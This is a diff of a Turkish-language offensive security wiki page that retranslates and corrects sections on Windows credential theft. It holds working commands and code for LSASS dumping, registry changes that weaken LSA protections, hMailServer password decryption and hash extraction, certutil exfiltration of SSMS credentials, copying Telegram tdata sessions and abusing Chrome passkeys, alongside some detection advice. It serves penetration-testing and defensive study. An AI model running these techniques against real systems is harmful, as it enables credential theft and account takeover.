   Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
@@ -368,11 +368,11 @@ Ink Dragon’ın FinalDraft RAT’i, teknikleri tüm red-teamer’lar için kull
     | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
   ```
 
-Hangi Domain Admin’in düzenli olarak bağlandığını öğrendikten sonra, **bağlantısı kesilmiş** oturumu hâlâ mevcutken LSASS’ı (LalsDumper/Mimikatz ile) dökümleyin. CredSSP + NTLM fallback, doğrulayıcılarını ve token’larını LSASS’ta bırakır; bunlar daha sonra SMB/WinRM üzerinden yeniden oynatılarak `NTDS.dit` alınabilir veya domain controller’larda kalıcılık sağlanabilir.
+Hangi Domain Admin'in düzenli olarak bağlandığını öğrendikten sonra, **bağlantısı kesilmiş** oturumu hâlâ açıkken LSASS'ı (LalsDumper/Mimikatz ile) dump edin. CredSSP + NTLM fallback, doğrulayıcılarını ve token'larını LSASS'te bırakır; bunlar daha sonra SMB/WinRM üzerinden tekrar oynatılarak `NTDS.dit` ele geçirilebilir veya domain controller'larda persistence sağlanabilir.
 
-### FinalDraft’in hedeflediği Registry düşürmeleri
+### FinalDraft'ın hedeflediği Registry downgrade'leri
 
-Aynı implant, credential hırsızlığını kolaylaştırmak için birkaç registry key’e de müdahale eder:<sup>[[3]](#references)</sup>
+Aynı implant, credential theft'i kolaylaştırmak için birkaç Registry anahtarını da kurcalar:<sup>[[3]](#references)</sup>
 
 ```cmd
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
@@ -381,18 +381,18 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t R
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
 ```
 
-* `DisableRestrictedAdmin=1` ayarlandığında RDP sırasında kimlik bilgisi/ticket yeniden kullanımı zorunlu hâle gelir ve pass-the-hash tarzı geçişler mümkün olur.
-* `LocalAccountTokenFilterPolicy=1`, UAC token filtrelemesini devre dışı bırakır; böylece yerel yöneticiler ağ üzerinden kısıtlanmamış token'lar alır.
-* `DSRMAdminLogonBehavior=2`, DC çevrimiçiyken DSRM yöneticisinin oturum açmasına izin verir ve saldırganlara yerleşik, yüksek ayrıcalıklı başka bir hesap sağlar.
-* `RunAsPPL=0`, LSASS PPL korumalarını kaldırarak LalsDumper gibi dökücüler için belleğe erişimi kolaylaştırır.
+* `DisableRestrictedAdmin=1`, gelen RDP bağlantıları için Restricted Admin'i devre dışı bırakır; bu mod üzerinden pass-the-hash özelliğini **etkinleştirmez**. Değeri `0` olarak ayarlamak hedefte Restricted Admin kullanımına izin verir, ancak istemci `/RestrictedAdmin` isteğinde bulunmalı veya Restricted Admin'i zorunlu kılan bir ilke kullanmalıdır.<sup>[[14]](#references)</sup> Tek başına bir hash, uzaktan yönetici hakları sağlamaz; bkz. [RDP kimlik doğrulama önkoşulları](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
+* `LocalAccountTokenFilterPolicy=1`, yerel yöneticilerin ağ üzerinden kısıtlanmamış tokenlar alması için UAC token filtrelemesini devre dışı bırakır.
+* `DSRMAdminLogonBehavior=2`, DC çevrimiçiyken DSRM yöneticisinin oturum açmasına izin vererek saldırganlara yerleşik, yüksek ayrıcalıklı başka bir hesap sağlar.
+* `RunAsPPL=0`, LSASS PPL korumalarını kaldırarak LalsDumper gibi döküm araçlarının belleğe erişmesini kolaylaştırır.
 
-## hMailServer yapılandırma kimlik bilgileri (ihlâl sonrası)
+## hMailServer yapılandırma kimlik bilgileri (sızma sonrası)
 
-Kurulum düzenine göre `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` ve `C:\ProgramData\hMailServer\hMailServer.ini` yapılandırma dosyalarının tam yollarını kontrol edin. Okunabilir ve boş olmayan bir `[Security] AdministratorPassword=` değeri, hMailServer yönetici parolası hash'idir; bu, bir Windows Administrator parolasının kanıtı değildir. Bu kimlik bilgisi elde edilirse, herhangi bir Windows hesabına geçiş için parola yeniden kullanımının ve oturum açma haklarının ayrıca doğrulanması gerekir.
+Kurulum düzenine göre `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` ve `C:\ProgramData\hMailServer\hMailServer.ini` dosyalarının tam yolunu kontrol edin. Okunabilir, boş olmayan bir `[Security] AdministratorPassword=` değeri, hMailServer yönetici parolası hash'idir; Windows Administrator parolasına kanıt oluşturmaz. Bu kimlik bilgisi elde edilirse, Windows hesabına geçiş için parola tekrarının ve oturum açma haklarının ayrıca doğrulanması gerekir.
 
-SQL CE veritabanı kullanan kurulumlarda, INI dosyasındaki ayrı `[Database] Password=` değeri veritabanını korur. Eski kurulumlarda bu değer, statik `THIS_KEY_IS_NOT_SECRET` anahtarı ve 4 baytlık sözcük endian dönüşümleri kullanılarak Blowfish ile şifrelenir. INI dosyasındaki hex dizgesini şu Python kod parçacığıyla kullanın:<sup>[[2]](#references)</sup>
+SQL CE veritabanı kullanan kurulumlarda, INI dosyasındaki ayrı `[Database] Password=` değeri veritabanını korur. Eski kurulumlarda bu değer, statik `THIS_KEY_IS_NOT_SECRET` anahtarı ve 4 baytlık sözcük endian dönüşümleri kullanılarak Blowfish ile şifrelenmiştir. INI dosyasındaki hex dizgesini şu Python kod parçacığıyla kullanın:<sup>[[2]](#references)</sup>
 
-Öncelikle mevcut hesabın hem INI dosyasını hem de ilgili SQL CE `.sdf` veritabanını okuyabildiğini doğrulayın. INI parolası veritabanını korur; veritabanında saklanan posta kutusu hesabı hash'lerinden ayrıdır. Kullanımdaki bir veritabanını incelemek veya yükseltmek için canlı dosyayı değil, bir **kopyasını** kullanın.
+Öncelikle mevcut hesabın hem INI dosyasını hem de karşılık gelen SQL CE `.sdf` veritabanını okuyabildiğini doğrulayın. INI parolası veritabanını korur; veritabanında depolanan posta kutusu hesabı hash'lerinden ayrıdır. Kullanımdaki bir veritabanını incelemek veya yükseltmek için canlı dosyayı değil, bir **kopyasını** kullanın.
 
 ```python
 from Crypto.Cipher import Blowfish
@@ -407,7 +407,7 @@ plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b
 print(plain.decode())
 ```
 
-Düz metin parolayla, dosya kilitlerini önlemek için SQL CE veritabanını kopyalayın, 32 bit sağlayıcıyı yükleyin ve hash'leri sorgulamadan önce gerekiyorsa yükseltin:
+Açık metin parolayla, dosya kilitlerini önlemek için SQL CE veritabanını kopyalayın, 32 bit provider'ı yükleyin ve hash'leri sorgulamadan önce gerekirse yükseltin:
 
 ```powershell
 Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
@@ -418,32 +418,32 @@ $conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windo
 $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
 ```
 
-`accountpassword` sütunu hMailServer hash formatını kullanır (hashcat mode `1421`). Kırılmış bir mailbox parolası, yalnızca bu parola bir local/domain hesap tarafından yeniden kullanılıyorsa ve bu hesap gerekli remote-logon haklarına sahipse Windows user pivot'u sağlar.
+`accountpassword` sütunu hMailServer hash formatını (`hashcat` mode `1421`) kullanır. Kırılmış bir posta kutusu parolası, yalnızca yerel/etki alanı hesabında yeniden kullanılıyorsa ve bu hesap gerekli uzaktan oturum açma haklarına sahipse Windows kullanıcısına geçiş için kullanılabilir.
 
 ## LSA Logon Callback Interception (LsaApLogonUserEx2)
 
-Bazı araçlar, LSA logon callback'i `LsaApLogonUserEx2`'yi intercept ederek **plaintext logon parolalarını** yakalar. Amaç, kimlik bilgilerinin **logon sırasında** (hash'lenmeden önce) yakalanması için authentication package callback'ini hook'lamak veya sarmalamak ve ardından bunları diske yazmak ya da operatöre döndürmektir. Bu genellikle LSA'ya inject olan veya LSA'ya kaydolan, ardından başarılı her interactive/network logon olayındaki username, domain ve parolayı kaydeden bir helper olarak uygulanır.<sup>[[1]](#references)</sup>
+Bazı araçlar, LSA logon callback `LsaApLogonUserEx2`'yi intercept ederek **plaintext logon passwords** yakalar. Amaç, kimlik doğrulama paketi callback'ini hook etmek veya sarmalamaktır; böylece kimlik bilgileri **logon sırasında** (hash'lenmeden önce) yakalanır ve ardından diske yazılır veya operatöre iletilir. Bu genellikle LSA'ya inject olan veya LSA'ya kaydolan, ardından her başarılı etkileşimli/ağ logon olayını kullanıcı adı, etki alanı ve parolayla birlikte kaydeden bir yardımcı araç olarak uygulanır.<sup>[[1]](#references)</sup>
 
 Operasyonel notlar:
-- Helper'ı authentication path'e yüklemek için local admin/SYSTEM gerekir.
-- Yakalanan kimlik bilgileri yalnızca bir logon gerçekleştiğinde görünür (hook'a bağlı olarak interactive, RDP, service veya network logon).
+- Yardımcı aracı kimlik doğrulama yoluna yüklemek için yerel admin/SYSTEM gerekir.
+- Yakalanan kimlik bilgileri yalnızca bir logon gerçekleştiğinde görünür (hook'a bağlı olarak etkileşimli, RDP, servis veya ağ logon'u).
 
 ## SSMS Saved Connection Credentials (sqlstudio.bin)
 
-SQL Server Management Studio (SSMS), kaydedilmiş bağlantı bilgilerini kullanıcı başına bir `sqlstudio.bin` dosyasında saklar. Özel dump araçları dosyayı ayrıştırıp kaydedilmiş SQL kimlik bilgilerini kurtarabilir. Yalnızca komut çıktısı döndüren shell'lerde dosya genellikle Base64 olarak kodlanıp stdout'a yazdırılarak exfiltrate edilir.<sup>[[1]](#references)</sup>
+SQL Server Management Studio (SSMS), kayıtlı bağlantı bilgilerini kullanıcı başına bir `sqlstudio.bin` dosyasında saklar. Özel dump araçları dosyayı ayrıştırıp kayıtlı SQL kimlik bilgilerini kurtarabilir. Yalnızca komut çıktısı döndüren shell'lerde dosya genellikle Base64 olarak kodlanıp stdout'a yazdırılarak exfiltrate edilir.<sup>[[1]](#references)</sup>
 
 ```cmd
 certutil -encode sqlstudio.bin sqlstudio.b64
 type sqlstudio.b64
 ```
 
-Operatör tarafında, dosyayı yeniden oluşturun ve kimlik bilgilerini kurtarmak için dumper'ı yerel olarak çalıştırın:
+Operatör tarafında, kimlik bilgilerini kurtarmak için dosyayı yeniden derleyin ve dumper'ı yerel olarak çalıştırın:
 
 ```bash
 base64 -d sqlstudio.b64 > sqlstudio.bin
 ```
 
-## Chrome DevTools Protocol üzerinden browser oturumu ve cookie hırsızlığı
+## Chrome DevTools Protocol üzerinden tarayıcı oturumu ve cookie hırsızlığı
 
 {{#ref}}
 ../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
@@ -451,11 +451,11 @@ base64 -d sqlstudio.b64 > sqlstudio.bin
 
 ## Telegram Desktop `tdata` oturumu hırsızlığı
 
-Telegram Desktop, yetkilendirme ve hesap durumunu **`tdata`** dizininde tutar. Kopyalanan bir oturum, yetkilendirme geçerli olduğu sürece hesap parolası olmadan kimlik doğrulaması yapmak için uyumlu araçlarla yüklenebilir; yerel veri şifrelemesi etkinse stealer'ın geçiş koduna da ihtiyacı vardır. Kimliği doğrulanmış bir oturum; kimlik verilerini, sohbet ve üyelik meta verilerini, mesajları ve indirilebilir medyayı açığa çıkarabilir.<sup>[[10]](#references)</sup>
+Telegram Desktop, yetkilendirme ve hesap durumunu **`tdata`** dizininde tutar. Kopyalanan bir oturum, yetkilendirme geçerli olduğu sürece hesap parolası olmadan kimlik doğrulamak için uyumlu araçlarla yüklenebilir; yerel veri şifrelemesi etkinse stealer'ın parolaya da ihtiyacı vardır. Ardından kimliği doğrulanmış bir oturum; kimlik verilerini, sohbet ve üyelik meta verilerini, mesajları ve indirilebilir medyayı açığa çıkarabilir.<sup>[[10]](#references)</sup>
 
 ### Keşif ve edinme
 
-Hem yüklü hem de taşınabilir düzenleri arayın; Microsoft Store paket adları değişiklik gösterdiğinden `TelegramMessenge` içeren paket dizinlerini listeleyin ve `LocalCache\Roaming` alt ağacını inceleyin.<sup>[[10]](#references)</sup>
+Yüklü ve taşınabilir kurulum konumlarının ikisini de arayın; Microsoft Store paket adları değişiklik gösterebilir, bu nedenle `TelegramMessenge` içeren paket dizinlerini listeleyin ve `LocalCache\Roaming` alt ağaçlarını inceleyin.<sup>[[10]](#references)</sup>
 
 ```powershell
 # Standard Telegram Desktop installation
@@ -470,36 +470,36 @@ Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
 Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
 ```
 
-Normal okuma başarısız olursa ve işlem belirteci `SeBackupPrivilege` ayrıcalığını **zaten içeriyor ve etkinleştirmişse**, backup-aware erişim bir alternatif sunar; ayrıcalığı edinmez veya işlemi yükseltmez. `CreateFileW`, `FILE_FLAG_BACKUP_SEMANTICS` ile backup/restore semantiği isteyebilir ve gerekli belirteç ayrıcalıkları mevcutsa dosya güvenlik denetimlerini aşabilir; ancak bu bayrak tek başına uyumsuz bir paylaşım kilidini aşmaz.<sup>[[10]](#references)[[11]](#references)</sup>
+Sıradan okuma işlemleri başarısız olursa ve süreç token'ı `SeBackupPrivilege` ayrıcalığını **zaten içeriyor ve etkinleştirmişse**, backup-aware erişim bir alternatif sunar; bu yöntem ayrıcalığı edinmez veya süreci yükseltmez. Gerekli token ayrıcalıkları mevcutsa `FILE_FLAG_BACKUP_SEMANTICS` ile `CreateFileW`, backup/restore semantiği isteyebilir ve dosya güvenlik denetimlerini atlayabilir; ancak bu bayrak tek başına uyumsuz bir paylaşım kilidini aşamaz.<sup>[[10]](#references)[[11]](#references)</sup>
 
-Kullanımda olan kilitli dosyalar için bir **Volume Shadow Copy** oluşturun/okuyun; ACL nedeniyle erişilemeyen dosyalar için `robocopy /B`, backup mode'u kullanır ve dosya ile dizin ACL'lerini aşar.<sup>[[10]](#references)[[12]](#references)</sup>
+Kullanımda kilitli dosyalar için bir **Volume Shadow Copy** oluşturup okuyun; ACL tarafından engellenen dosyalar için `robocopy /B`, backup modunu kullanır ve dosya ile dizin ACL'lerini atlar.<sup>[[10]](#references)[[12]](#references)</sup>
 
 ```cmd
 whoami /priv
 robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
 ```
 
-Bir bant genişliğine duyarlı implant önce yalnızca dosya yolu envanterini gönderebilir, C2 tarafından zaten depolanmış yollarla birlikte bir anlık görüntü tanımlayıcısı alabilir ve yalnızca eksik dosyaları yükleyebilir. Bu nedenle, özyinelemeli `tdata` numaralandırmasından sonra gerçekleşen küçük artımlı aktarımlar bile başarılı bir oturum hırsızlığına işaret edebilir.<sup>[[10]](#references)</sup>
+Bant genişliğini gözeten bir implant, önce yalnızca dosya yollarının envanterini gönderebilir, C2'den bir anlık görüntü tanımlayıcısı ve C2'de zaten kayıtlı olan yolları alabilir, ardından yalnızca eksik dosyaları yükleyebilir. Bu nedenle, özyinelemeli `tdata` envanterlemesinden sonraki küçük artımlı aktarımlar bile oturum hırsızlığının başarılı olduğunu gösterebilir.<sup>[[10]](#references)</sup>
 
-### Tespit ve sınırlama
+### Tespit ve müdahale
 
-Telegram dışı bir süreç tarafından `tdata` dizinine özyinelemeli erişimi; `SeBackupPrivilege` etkinleştirilmesi, yedekleme semantiğiyle dosya açılması, VSS etkinliği veya `/B` kullanan bir alt süreç `robocopy.exe` ile ilişkilendirin. Ayrıca, aynı süreçten dışa dönük bağlantılar kurulmadan önce hem `%APPDATA%` hem de `%LOCALAPPDATA%\Packages` dizinlerinin hızla numaralandırılıp numaralandırılmadığını araştırın. Ele geçirilmenin ardından, tanımadığınız oturumları sonlandırmak için **Ayarlar → Cihazlar** (veya **Gizlilik ve Güvenlik → Etkin Oturumlar**) bölümünü kullanın; yalnızca iki adımlı doğrulamayı etkinleştirmek, önceden çalınmış bir yetkilendirmeyi iptal etmez.<sup>[[10]](#references)[[13]](#references)</sup>
+Telegram dışındaki bir işlem tarafından `tdata` dizinine özyinelemeli erişimi; `SeBackupPrivilege` etkinleştirilmesi, yedekleme semantiği kullanan dosya açma işlemleri, VSS etkinliği veya `/B` kullanan bir alt `robocopy.exe` işlemiyle ilişkilendirin. Ayrıca `%APPDATA%` ve `%LOCALAPPDATA%\Packages` dizinlerinin hızla taranmasını ve ardından aynı işlemden yapılan giden bağlantıları araştırın. İhlal sonrasında, tanımadığınız oturumları sonlandırmak için **Settings → Devices** (veya **Privacy & Security → Active Sessions**) bölümünü kullanın; yalnızca iki adımlı doğrulamayı etkinleştirmek, daha önce çalınmış bir yetkilendirmeyi iptal etmez.<sup>[[10]](#references)[[13]](#references)</sup>
 
 ## Windows'ta Chrome'dan Passkeys / WebAuthn kimlik bilgisi hırsızlığı
 
-**Google Password Manager ile senkronize passkeys** kullanan bir Windows ana bilgisayarında **kurban kullanıcı** olarak kod yürütme elde edilirse, passkeys **admin/SYSTEM yetkisi olmadan bile** ele geçirme sonrası için ilgi çekici bir hedeftir.<sup>[[4]](#references)</sup>
+**Chrome + Google Password Manager ile eşitlenen passkeys** kullanan bir Windows ana bilgisayarında **kurban kullanıcısı** olarak kod yürütme elde edilirse, **admin/SYSTEM olmadan da** passkeys ilgi çekici bir post-exploitation hedefi hâline gelir.<sup>[[4]](#references)</sup>
 
-### İlgi çekici yerel yapıtlar
+### İlgi çekici yerel artefaktlar
 
 ```text
 %LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
 %LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
 ```
 
-- **`Sync Data\LevelDB`**, protobuf ile kodlanmış **`WebauthnCredentialSpecifics`** kayıtlarını depolar. Aynı kullanıcıya ait bir süreç, senkronize edilmiş passkey'ler için **RP ID**, **kullanıcı adı**, **credential ID** ve şifrelenmiş özel anahtar materyalini listeleyebilir.<sup>[[5]](#references)</sup>
-- **`passkey_enclave_state`**, **`wrapped_identity_private_key`** ve senkronize edilmiş kimlik bilgilerini kurtarmak için kullanılan wrapped secret gibi yerel cihaz kaydı durumunu depolar.<sup>[[4]](#references)</sup>
+- **`Sync Data\LevelDB`**, protobuf ile kodlanmış **`WebauthnCredentialSpecifics`** kayıtlarını depolar. Aynı kullanıcıya ait bir işlem, eşitlenen passkey’lerin **RP ID**’sini, **username**’ini, **credential ID**’sini ve şifrelenmiş private-key materyalini listeleyebilir.<sup>[[5]](#references)</sup>
+- **`passkey_enclave_state`**, **`wrapped_identity_private_key`** ve eşitlenen kimlik bilgilerini kurtarmak için kullanılan sarılmış sır gibi yerel cihaz kaydı durumunu depolar.<sup>[[4]](#references)</sup>
 
-Hızlı ön inceleme:
+Hızlı triyaj:
 
 ```powershell
 Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
@@ -507,9 +507,9 @@ Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
   Select-Object FullName, Length, LastWriteTime
 ```
 
-### TPM'e bağlı anahtar blob'ları yerel imzalama oracle'ı olarak yine de kötüye kullanılabilir
+### TPM'e bağlı anahtar blob'ları yerel imzalama oracle'ı olarak kötüye kullanılabilir
 
-Tarayıcı, TPM destekli bir kimlik anahtarını **`NCRYPT_OPAQUE_KEY_BLOB`** olarak dışa aktarır ve bu blob'u kullanıcının erişebildiği bir konumda saklarsa, malware'in ham özel anahtarı çıkarması **gerekmez**. Blob'u **aynı makinede** yeniden içe aktarabilir ve yerel TPM'den saldırganın denetimindeki verileri imzalamasını isteyebilir:<sup>[[4]](#references)[[6]](#references)</sup>
+Tarayıcı, TPM destekli bir kimlik anahtarını **`NCRYPT_OPAQUE_KEY_BLOB`** olarak dışa aktarır ve bu blob'u kullanıcının erişebildiği bir durumda saklarsa, malware'in ham özel anahtarı çıkarması **gerekmez**. Blob'u yalnızca **aynı makinede** yeniden içe aktarabilir ve yerel TPM'den saldırganın kontrolündeki verileri imzalamasını isteyebilir:<sup>[[4]](#references)[[6]](#references)</sup>
 
 ```c
 NCryptOpenStorageProvider(...)
@@ -517,46 +517,48 @@ NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
 NCryptSignHash(...)
 ```
 
-This, **hardware binding'in cihaz dışına aktarımı engellediği ancak ele geçirilmiş uç noktada aynı kullanıcı tarafından kullanımı engellemediği** anlamına gelir.
+Bu, **hardware binding'in cihaz dışına aktarımı önlediği ancak ele geçirilmiş uç noktada aynı kullanıcı tarafından kullanımı engellemediği** anlamına gelir.
 
-### Uygulamadaki kötüye kullanım yolları
+### Pratik kötüye kullanım yolları
 
-1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
-   - Chrome'un LevelDB'inden `WebauthnCredentialSpecifics` kayıtlarını listeleyin.
-   - Bir passkey oturumu başlatıp yeni bir WebAuthn challenge alın.
-   - Cloud-authenticator isteğinin binding'ini imzalamak için çalınan `wrapped_identity_private_key` blob'unu kurbanın TPM'inde kullanın.
-   - Dönen assertion'ı relying party'ye iletin.
-   - Bu yöntem, RP'nin `userVerification=preferred` değerini kabul etmesi veya **`UV=0`** olan assertion'ları reddetmemesi durumunda özellikle değerlidir.
-2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
-   - `passkey_enclave_state` dosyasını silerek veya geçerli, imzalı bir `device/forget` işlemi göndererek yeniden kayda alınmayı zorlayın.
-   - Kayıt işlemi cihazı **`uv_key_pending`** durumunda bırakırsa, saldırganın kontrolündeki bir UV public key kaydedin.
-   - Sağlayıcı yeni UV key'in attestation'ını / secure-hardware kaynağını doğrulamazsa, saldırganın key'iyle daha sonra atılan imzalar **`UV=1`** olarak değerlendirilir.
-3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
-   - Chrome'un senkronize edilmiş passkey master secret'ını getirmesi için kurtarma veya yeniden katılma işlemini zorlayın.
-   - `passkey_enclave_state` dosyasının yeniden oluşturulmasını/değiştirilmesini izleyin, ardından düz metin **security domain secret (SDS)** bellekteyken Chrome belleğini dökümleyin.
-   - Kurtarılan SDS'yi kullanarak her `WebauthnCredentialSpecifics` kaydındaki şifrelenmiş alanları çözün ve taşınabilir WebAuthn private key'lerini kurtarın.
+1. **Pass-ta-key / cihaz kimliği aktarımı**<sup>[[4]](#references)</sup>
+   - Chrome'un LevelDB veritabanından `WebauthnCredentialSpecifics` kayıtlarını listeleyin.
+   - Bir passkey oturumu başlatın ve yeni bir WebAuthn challenge alın.
+   - Bulut kimlik doğrulayıcı isteği bağlamasını imzalamak için çalınan `wrapped_identity_private_key` blob'unu kurbanın TPM'sinde kullanın.
+   - Döndürülen assertion'ı relying party'ye aktarın.
+   - RP'nin `userVerification=preferred` değerini kabul ettiği veya **`UV=0`** olan assertion'ları reddetmediği durumlarda bu yöntem özellikle değerlidir.
+2. **Bekleyen UV key'in ele geçirilmesi**<sup>[[4]](#references)</sup>
+   - `passkey_enclave_state` öğesini silerek veya geçerli, imzalı bir `device/forget` işlemi göndererek yeniden onboarding yapılmasını zorlayın.
+   - Onboarding sonrasında cihaz **`uv_key_pending`** durumunda kalırsa, saldırganın kontrolündeki bir UV public key kaydedin.
+   - Sağlayıcı yeni UV key'in attestation / secure-hardware kaynağını doğrulamazsa, saldırganın key'iyle yapılan sonraki imzalar **`UV=1`** olarak değerlendirilir.
+3. **Master secret / SDS kurtarma hırsızlığı**<sup>[[4]](#references)</sup>
+   - Chrome'un senkronize passkey master secret'ını alması için kurtarma veya yeniden katılma işlemini zorlayın.
+   - `passkey_enclave_state` öğesinin yeniden oluşturulmasını/değiştirilmesini izleyin, ardından düz metin **security domain secret (SDS)** bellekte bulunduğu sırada Chrome belleğini dökümleyin.
+   - Kurtarılan SDS'yi kullanarak her `WebauthnCredentialSpecifics` kaydındaki şifrelenmiş alanların şifresini çözün ve taşınabilir WebAuthn private key'leri kurtarın.
 
-### DFIR / tespit önerileri
+### DFIR / tespit fikirleri
 
-- `passkey_enclave_state` dosyasının **silinmesini/yeniden oluşturulmasını** izleyin.<sup>[[4]](#references)</sup>
-- Tarayıcı dışı işlemlerin Chrome **`Sync Data\LevelDB`** alanına olağandışı erişimi için uyarı oluşturun.
+- `passkey_enclave_state` öğesinin **silinmesini/yeniden oluşturulmasını** izleyin.<sup>[[4]](#references)</sup>
+- Tarayıcı dışı işlemlerin Chrome **`Sync Data\LevelDB`** öğesine anormal erişimi için uyarı oluşturun.
 - **Chrome bellek dökümleri** veya şüpheli süreçler arası bellek erişimi için uyarı oluşturun.
-- Tekrarlanan **Google Password Manager kurtarma PIN'i** istemlerini veya beklenmedik yeniden kaydı inceleyin.
-- WebAuthn **`signCount`** değerinin senkronize passkey'lerde genellikle işe yaramadığını ve sabit kalabileceğini unutmayın; bu nedenle klasik klon tespiti zayıftır.
+- Tekrarlanan **Google Password Manager kurtarma PIN'i** istemlerini veya beklenmeyen yeniden onboarding işlemlerini araştırın.
+- WebAuthn **`signCount`** değerinin senkronize passkey'lerde çoğu zaman kullanışlı olmadığını, sabit kalabileceğini unutmayın; bu nedenle klasik klon tespiti zayıftır.
 
 ## References
 
-- [1] [Unit 42 – Yüksek Değerli Sektörleri Hedef Alan Yıllarca Tespit Edilmemiş Operasyonlara Yönelik Bir İnceleme](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
-- [2] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgisi çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
-- [3] [Check Point Research – Ink Dragon'un İç Yüzü: Gizli Bir Saldırı Operasyonunun Relay Ağı ve İşleyişinin Ortaya Çıkarılması](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
-- [4] [Unit 42 – Passkey'i Ele Geçirme: Parolasız Kimlik Doğrulamada Yeni Bir Saldırı Yüzeyi](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
+- [1] [Unit 42 – Yüksek Değerli Sektörleri Hedef Alan, Yıllarca Tespit Edilmeden Sürdürülen Operasyonların İncelenmesi](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
+- [2] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgisi şifresinin çözülmesi → SYSTEM yetkisi için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
+- [3] [Check Point Research – Ink Dragon'ın İç Yüzü: Gizli Saldırı Operasyonunun Aktarım Ağı ve İşleyişinin Ortaya Çıkarılması](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [4] [Unit 42 – Pass the Passkey: Şifresiz Kimlik Doğrulamada Yeni Bir Saldırı Yüzeyi](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
 - [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
-- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
-- [7] [0xWord – Windows Hacking: Microsoft Sistem ve Ağlarına Yönelik Saldırılar](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
-- [8] [Active Directory Data Store'un Gerçek İşleyişi: NTDS.dit'in İç Yüzü (Bölüm 1)](https://blog.chrisse.se/?p=762)
+- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key depolama](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
+- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
+- [8] [Active Directory Veri Deposu Gerçekte Nasıl Çalışır: NTDS.dit'in İç Yüzü (1. Bölüm)](https://blog.chrisse.se/?p=762)
 - [9] [en.hackndo.com - Uzak Lsass Bellek Dökümünden Parolaları Alma](https://en.hackndo.com/remote-lsass-dump-passwords)
 - [10] [Kaspersky Securelist – Armored Likho, Still Toolkit ile Siber Casusluk Cephaneliğini Genişletiyor](https://securelist.com/armored-likho-still-toolkit/121033)
 - [11] [Microsoft Learn – CreateFileW işlevi ve `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
 - [12] [Microsoft Learn – Robocopy `/B` yedekleme modu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
-- [13] [Telegram FAQ – etkin oturumları sonlandırma](https://telegram.org/faq)
+- [13] [Telegram SSS – etkin oturumları sonlandırma](https://telegram.org/faq)
+- [14] [Microsoft Learn: Remote Credential Guard ve Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
+- [15] [Microsoft Learn: Kimlik Bilgilerinin Korunması ve Yönetimi](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
 {{#include ../../banners/hacktricks-training.md}}
